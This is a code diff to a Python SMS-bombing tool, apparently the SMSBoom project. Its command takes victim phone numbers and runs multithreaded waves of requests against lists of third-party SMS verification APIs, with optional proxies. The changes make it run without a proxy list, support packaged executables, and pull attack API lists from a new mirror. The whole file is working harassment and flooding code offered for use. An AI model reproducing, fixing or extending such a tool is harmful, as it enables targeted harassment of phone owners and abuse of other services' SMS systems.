@@ -14,9 +14,13 @@ import sys
 import time
 import click
 import httpx
+import os
 
-# current directory
-path = pathlib.Path(__file__).parent
+# 確定應用程序係一個腳本文件或凍結EXE
+if getattr(sys, 'frozen', False):
+    path = os.path.dirname(sys.executable)
+elif __file__:
+    path = os.path.dirname(__file__)
 
 
 def load_proxies() -> list:
@@ -106,33 +110,40 @@ def load_getapi() -> list:
 
 
 @click.command()
-@click.option("--thread","--t","-t", help="线程数(默认64)", default=64)
-@click.option("--phone", "-p","-P","--P","--p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
+@click.option("--thread", "-t", help="线程数(默认64)", default=64)
+@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
 @click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
 @click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
 @click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
 def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
     """传入线程数和手机号启动轰炸,支持多手机号"""
-    logger.info(f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
+    logger.info(
+        f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
     with ThreadPoolExecutor(max_workers=thread) as pool:
         try:
             _api = load_json()
             _api_get = load_getapi()
             _proxies = load_proxies()
+            # fix: by Ethan
+            if not _proxies:
+                _proxies = [None]
         except ValueError:
             logger.error("读取接口出错!正在重新下载接口数据!....")
             update()
             sys.exit(1)
         for i in range(1, frequency + 1):
             logger.success(f"第{i}波轰炸开始！")
+            # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
             for proxy in _proxies:
                 logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
                                proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
                 # 不可用的代理或API过多可能会影响轰炸效果
                 for api in _api:
-                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(reqFunc, api, phone)
+                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
+                        reqFunc, api, phone)
                 for api_get in _api_get:
-                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(reqFunc, api_get, phone)
+                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(
+                        reqFunc, api_get, phone)
                 logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                 time.sleep(interval)
 
@@ -169,8 +180,8 @@ def oneRun(phone):
 @click.command()
 def update():
     """从 github 获取最新接口"""
-    GETAPI_json_url = f"https://hk1.monika.love/AdminWhaleFall/SMSBoom/master/GETAPI.json"
-    API_json_url = f"https://hk1.monika.love/AdminWhaleFall/SMSBoom/master/api.json"
+    GETAPI_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/GETAPI.json"
+    API_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/api.json"
     logger.info(f"正在从GitHub拉取最新接口!")
     try:
         with httpx.Client(verify=False, timeout=10) as client:
